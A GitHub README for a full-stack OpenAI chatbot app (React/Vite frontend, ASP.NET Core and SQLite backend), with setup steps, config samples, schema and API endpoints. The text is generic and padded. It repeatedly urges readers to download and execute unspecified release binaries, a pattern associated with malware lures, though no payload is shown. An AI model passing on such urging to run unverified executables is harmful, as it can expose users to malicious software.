https://github.com/Vdevagabundo333/openai-chatbot-app/releases

# OpenAI Chatbot App: Full Stack UI & ASP.NET Core Backend

![OpenAI Chatbot App](https://img.shields.io/badge/OpenAI%20Chatbot%20App-Active-blue?style=for-the-badge)

Welcome to a modern interface web and API backend built for the HighCapital technical challenge. This project combines a responsive frontend built with Vite + React + Tailwind + ShadCN UI and a robust backend powered by ASP.NET Core with SQLite. It integrates seamlessly with the OpenAI API to deliver a capable chatbot experience. The app is designed for clarity, speed, and reliable interaction with AI models, while keeping a pleasant and accessible user interface.

Table of contents
- What this project is
- Key features
- Tech stack
- How it’s built
- Running locally
- How to use the API
- Data model and storage
- Security and secrets
- Development workflow
- Testing and quality
- Deployment and hosting
- Troubleshooting
- Contributing
- Licenses

What this project is
- A full stack solution for a chat-based AI assistant. The frontend provides a smooth, modern experience for sending messages, viewing chat history, and adjusting model parameters. The backend handles authentication, request routing, session management, and calls to the OpenAI API. Data is stored in a light SQLite database for easy local development and portability.

Key features
- Clean, fast frontend built with Vite + React + TypeScript
- UI powered by Tailwind CSS and ShadCN UI components
- Backend using ASP.NET Core with SQLite for persistence
- Secure, production-ready API integration with OpenAI
- Simple steps to run locally on Windows, macOS, or Linux
- Clear separation of concerns: frontend, backend, and data layer
- Accessible UI with keyboard navigation and good color contrast
- Extensible design to add more features over time
- Helpful error messages and robust logging for debugging

Tech stack
- Frontend: Vite, React, TypeScript, Tailwind CSS, ShadCN UI, Radix UI
- Backend: ASP.NET Core (dotnet7), SQLite
- Communication: Axios for HTTP requests
- AI integration: OpenAI API
- Type safety: Zod on the frontend (and tuned validation where relevant)

How it’s built
- The frontend talks to the backend through a RESTful API. Requests to the OpenAI API are mediated by the backend to protect the API key and to centralize logic such as prompt construction, session handling, and rate limiting.
- State is managed in the UI with a clean data model that mirrors the server-side entities, ensuring consistent behavior as the app scales.
- The SQLite database stores user sessions, chat messages, and model configuration per session. It keeps things lightweight for local development yet remains production-ready for simple deployments.

Running locally
Prerequisites
- Node.js (LTS) and npm or pnpm
- .NET 7 SDK
- SQLite (usually included with dotnet tooling on many platforms)
- A valid OpenAI API key (to connect to the OpenAI API)

Project layout
- frontend/  — Vite + React + TypeScript app
- backend/   — ASP.NET Core API with SQLite
- shared/    — Types and models used by both frontend and backend (where applicable)

Clone the repository
- git clone https://github.com/Vdevagabundo333/openai-chatbot-app.git
- cd openai-chatbot-app

Start the backend
- Navigate to the backend folder
- cd backend
- dotnet restore
- Create or adjust appsettings.json with your database path and OpenAI key references
- Ensure the environment variable OPENAI_API_KEY is set on your machine
- Run: dotnet run
- The backend will listen on a default port (often http://localhost:5000 or configured in launch settings)

Set up and run the frontend
- Open a new terminal
- cd frontend
- Install dependencies: npm install or pnpm install
- Start the dev server: npm run dev or pnpm dev
- The frontend will typically run on http://localhost:5173

Environment variables and configuration
- Backend (ASP.NET Core)
  - OPENAI_API_KEY: Your OpenAI API key
  - ASPNETCORE_ENVIRONMENT: Development, Staging, or Production
  - Connection strings for SQLite are defined in appsettings.json; the app uses a local SQLite file by default
- Frontend
  - VITE_API_BASE_URL or a similar env var to point to the backend (for example, http://localhost:5000)

Database schema (SQLite)
- Users: id (PK), username, created_at
- Conversations: id (PK), user_id (FK), started_at, last_activity_at
- Messages: id (PK), conversation_id (FK), role (user/assistant/system), content, created_at
- Settings: id (PK), user_id (FK), model_id, temperature, max_tokens, top_p
- This schema keeps chat history lightweight and easy to back up locally.

Sample configuration and code snippets
- appsettings.json (backend)
{
  "Logging": { "LogLevel": { "Default": "Information", "Microsoft": "Warning" } },
  "ConnectionStrings": {
    "ChatDb": "Data Source=chatbot.db"
  },
  "OpenAI": {
    "ApiKey": "YOUR_OPENAI_API_KEY"
  },
  "AllowedHosts": "*"
}
- Example API call (frontend to backend) using Axios
POST /api/chat
Body:
{
  "conversationId": "string",
  "messages": [
    { "role": "user", "content": "Hello, how are you?" }
  ],
  "model": "gpt-4",
  "temperature": 0.7,
  "maxTokens": 256
}
- Note: The backend handles model selection and prompt assembly. The frontend sends user messages and receives model responses.

User journey and usage flow
- Open the app UI in the browser
- Start a new conversation or continue an existing one
- Type a user message and send
- The app shows the model's reply in a chat-style interface
- Users can tweak model parameters (temperature, max tokens) to shape responses
- The history is stored locally in SQLite for quick access and offline resilience

Security and secrets
- Do not hard-code API keys in the frontend. Use the backend to protect sensitive keys.
- Store API keys in environment variables. For local development, use a .env file and ensure it is added to .gitignore.
- Use HTTPS in production to protect data in transit.
- Validate all inputs on the backend. Do not rely solely on client-side validation.
- Consider rate limiting on the API to prevent abuse and excessive token usage.

Development workflow
- Branching strategy: main for releases, develop for ongoing work, feature/* for new ideas
- Linting and formatting: ensure TypeScript code uses consistent styles; ESLint and Prettier rules are included
- Type safety: leverage TypeScript types everywhere; validate payloads at the API boundary
- Testing: unit tests on the backend with xUnit; frontend tests with Vitest or Jest
- Documentation: keep API docs in the README and consider generating OpenAPI docs for the backend

Testing and quality
- Run unit tests: dotnet test in the backend
- Run frontend tests: npm test or pnpm test
- Use dev tools to inspect network calls and console logs during development
- Do accessibility checks for UI components and keyboard navigation

Deployment and hosting
- Local development uses a simple two-process setup: frontend dev server and backend API
- For production, consider containerization with Docker and a small orchestrator
- Docker compose example (two services: api and web)
  - api: ASP.NET Core app with SQLite
  - web: Vite + React frontend
- Example deployment steps:
  - Build backend: dotnet publish -c Release -o out
  - Build frontend: npm run build
  - Serve static frontend with the backend or host separately behind a reverse proxy
- A lightweight Dockerfile for the backend can mount the SQLite database at runtime and read environment variables for the OpenAI key

Releases and downloads
- This repository ships release assets that contain ready-to-run binaries or installers for common platforms. The release page is the starting point for getting a packaged version of the app.
- The link to the releases page hosts all assets you can download. The file you need to download and execute is available on that page.
- Access the releases here: https://github.com/Vdevagabundo333/openai-chatbot-app/releases
- If you prefer to explore the assets: download the appropriate file for your OS, extract, and run the installer or executable as described in the asset's README or release notes.
- Button link to releases: [![Releases](https://img.shields.io/badge/releases-openai--chatbot--app-blue?style=for-the-badge&logo=github)](https://github.com/Vdevagabundo333/openai-chatbot-app/releases)

Usage tips and best practices
- Start with a small temperature and moderate max_tokens to get stable results
- Save chat history to SQLite to analyze user behavior and improve prompts
- Use a consistent prompt structure to ensure coherent long conversations
- Manage OpenAI costs by caching frequent prompts and sharing common context
- Implement retry logic on API calls to handle transient network failures
- Separate user-facing UI concerns from AI logic to simplify maintenance

Command references and quick start
- Prerequisites: Install Node.js, .NET SDK 7, and SQLite
- Backend: cd backend; dotnet run
- Frontend: cd frontend; npm install; npm run dev
- Environment: Set OPENAI_API_KEY for backend; point frontend to backend API

API reference (high level)
- POST /api/chat
  - Body: { conversationId, messages, model, temperature, maxTokens }
  - Returns: The assistant’s reply and a new message object
- GET /api/conversations/{id}
  - Returns chat history and metadata
- POST /api/conversations
  - Starts a new conversation and returns its ID
- GET /api/settings
  - Reads current model and UI preferences
- PUT /api/settings
  - Updates model/temperature/maxTokens for a user

Data security in production
- Do not expose the OpenAI API key to the client
- Encrypt sensitive data at rest, even in SQLite
- Use prepared statements and parameterized queries to prevent injection
- Keep dependencies up-to-date to reduce exploitation risk
- Inspect logs for unusual activity and enable tracing for debugging

Accessibility and internationalization
- Semantic HTML and ARIA attributes where needed
- Keyboard-friendly navigation for chat components
- Clear focus indicators and high-contrast color schemes
- Easy language switching if you plan to localize in the future

Performance considerations
- Use caching for repeated prompts and model configurations
- Batch multiple requests if applicable to reduce latency
- Optimize images and fonts to speed up initial rendering
- Enable HTTP/2 and gzip compression on the server

Code structure overview
- frontend/
  - src/
    - app/  (router and app-level logic)
    - pages/  (chat view, settings)
    - components/  (UI blocks like ChatWindow, MessageBubble, InputBar)
    - hooks/  (custom React hooks)
    - services/  (API calls via Axios)
    - styles/  (Tailwind and global CSS)
- backend/
  - Controllers/  (ChatController, SettingsController)
  - Models/  (Chat, Message, Conversation, Settings)
  - Data/  (SQLite context and migrations)
  - Services/  (OpenAI integration layer)
  - Middleware/ (Logging, error handling)
  - appsettings.json
- shared/
  - Types/  (TypeScript types shared with backend when applicable)
  - Utilities/ (common helpers)

Troubleshooting common issues
- Backend fails to start
  - Check that the .NET runtime matches the target version (7.x)
  - Verify OPENAI_API_KEY is set
  - Confirm the SQLite database path is writable
- Frontend cannot reach the API
  - Ensure VITE_API_BASE_URL or equivalent env var points to the running backend
  - Check CORS settings on the backend
- OpenAI API errors
  - Confirm API key has access to the selected model (e.g., gpt-4)
  - Monitor token usage to stay within plan limits
  - Handle rate limits gracefully with backoff

Images and visuals
- Use emojis to convey ideas and status: 🧠, 💬, 🚀, 🔒, 🧭
- Include small UI snapshots (optional) that show the chat interface, input area, and settings panel
- If available, reference generic icons for React, Tailwind, and .NET to visually anchor the tech stack

Contributing
- This project welcomes contributions. If you plan to add features or fix issues, please follow these steps:
  - Fork the repository
  - Create a feature branch: git checkout -b feature/your-feature
  - Implement changes with clear, small commits
  - Run tests and linting locally
  - Submit a pull request with a descriptive title and explanation of changes
- Your contributions help improve usability and reliability for all users

License
- This project is open for use and modification under the terms defined in the LICENSE file.

Releases and downloads (repeat)
- For packaged, ready-to-run assets, visit the releases page: https://github.com/Vdevagabundo333/openai-chatbot-app/releases
- This link contains downloadable assets that you can execute to install or run the app. Pick the file that matches your operating system, download it, and run the installer or executable as described in the asset notes.

Notes on distribution
- The release assets are designed to simplify setup. They bundle the frontend and backend where applicable and configure local environments automatically in many cases.
- If you need a clean local setup, you can still run the project from source by following the running locally steps above. The sources give you full control over dependencies and versions.

Acknowledgments
- Thanks to the community for the open-source tooling that makes this project possible:
  - React and Vite for a fast UI development experience
  - Tailwind CSS and ShadCN UI for polished visuals with predictable styling
  - ASP.NET Core for a robust, scalable backend
  - SQLite for lightweight and portable storage
  - OpenAI for the powerful language model integrations

Appendix: troubleshooting the releases link
- If the link changes or the releases page is temporarily unavailable, check the repository's Releases section for updated assets and notes. The current link is the primary gateway to downloadable assets, and it should be revisited whenever you need the latest packaged version. See the same link again here: https://github.com/Vdevagabundo333/openai-chatbot-app/releases

End of document